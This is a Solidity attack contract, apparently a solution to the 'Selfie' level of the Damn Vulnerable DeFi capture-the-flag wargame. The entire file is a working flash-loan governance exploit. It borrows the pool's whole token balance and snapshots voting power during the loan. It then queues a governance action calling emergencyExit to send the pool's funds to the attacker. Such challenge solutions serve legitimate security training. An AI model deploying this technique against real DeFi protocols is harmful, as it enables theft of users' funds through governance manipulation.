// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool, SimpleGovernance, IERC3156FlashBorrower} from "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableTokenSnapshot private token;
    uint256 public actionId;

    constructor(address _pool, address _governance) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(address(pool.token()));
    }

    function attack() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            pool.maxFlashLoan(address(token)),
            "0x"
        );
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSelector(
                SelfiePool.emergencyExit.selector,
                msg.sender
            )
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes memory
    ) external returns (bytes32) {
        token.snapshot();

        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
